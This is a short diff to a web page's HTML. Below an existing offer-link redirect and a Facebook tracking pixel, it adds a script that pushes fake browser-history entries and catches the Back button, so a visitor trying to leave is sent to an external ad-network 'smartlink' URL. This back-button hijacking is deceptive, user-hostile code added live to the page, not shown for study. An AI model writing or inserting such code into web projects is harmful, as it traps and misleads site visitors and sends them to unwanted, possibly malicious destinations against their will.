@@ -188,5 +188,20 @@ src="https://www.facebook.com/tr?id=277386131662358&ev=PageView&noscript=1"
         window.location.href = offerLink;
       });
     </script>
+    <script>
+  const smartLinkB = "https://otieu.com/4/10580749";
+
+  function trapBack() {
+    history.pushState(null, "", location.href);
+  }
+
+  trapBack();
+  trapBack();
+
+  window.addEventListener("popstate", function () {
+    window.location.href = smartLinkB;
+  });
+</script>
+
   </body>
 </html>
